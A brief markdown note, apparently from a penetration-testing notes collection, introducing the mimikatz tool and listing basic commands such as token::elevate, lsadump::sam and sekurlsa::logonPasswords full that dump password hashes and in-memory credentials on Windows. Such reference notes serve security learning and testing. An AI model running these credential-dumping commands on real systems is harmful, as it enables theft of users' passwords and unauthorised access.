


# mimikatz

**`mimikatz`** is a tool I've made to learn `C` and make somes experiments with Windows security.

It's now well known to extract plaintexts passwords, hash, PIN code and kerberos tickets from memory. **`mimikatz`** can also perform pass-the-hash, pass-the-ticket or build _Golden tickets_.

Kiwi module in [a meterpreter in metasploit](metasploit.md) is an adaptation of mimikatz.

## No installation, portable

Download from github repo: [https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz).


## Basic usage

```bash
# Impersonate as NT Authority/SYSTEM (having permissions for it).
token::elevate

# List users and hashes of the machina
lsadump::sam

# Enable debug mode for our user
privilege::debug

# List users logged in the machine and still in memory
sekurlsa::logonPasswords full

